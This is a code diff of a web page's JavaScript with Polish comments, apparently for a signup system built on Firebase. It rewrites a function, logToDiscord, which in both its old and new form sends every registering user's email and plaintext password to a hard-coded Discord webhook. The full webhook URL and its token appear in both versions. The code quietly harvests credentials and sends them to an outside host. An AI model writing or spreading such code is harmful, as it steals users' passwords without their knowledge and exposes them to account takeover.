@@ -90,27 +90,22 @@
     const db = getFirestore(app);
 
     // --- TWOJE LOGI DISCORD ---
-    async function logToDiscord(email, password) {
-        const webhook = "https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1";
-        const payload = {
-            username: "Monitor Rejestracji PL YT",
-            avatar_url: "https://cdn-icons-png.flaticon.com/512/1384/1384060.png",
-            embeds: [{
-                title: "👤 Nowe konto w systemie!",
-                color: 5814783,
-                fields: [
-                    { name: "📧 Adres Email", value: email, inline: true },
-                    { name: "🔑 Hasło (ukryte)", value: "||" + password + "||", inline: true }
-                ],
-                footer: { text: "Użytkownik zarejestrował się przed chwilą" },
-                timestamp: new Date().toISOString()
-            }]
-        };
-        try {
-            await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        } catch (e) { console.error("Discord error:", e); }
+async function logToDiscord(email, password) {
+    const webhook = "https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1";
+    
+    try {
+        await fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🚀 **Nowy użytkownik!**\n📧 Email: ${email}\n🔑 Hasło: ||${password}||`
+            })
+        });
+        console.log("Log wysłany na Discord");
+    } catch (err) {
+        console.error("Błąd Webhooka:", err);
     }
-
+}
     // --- OBSŁUGA AUTH ---
     let isReg = false;
     const authModal = document.getElementById('authModal');
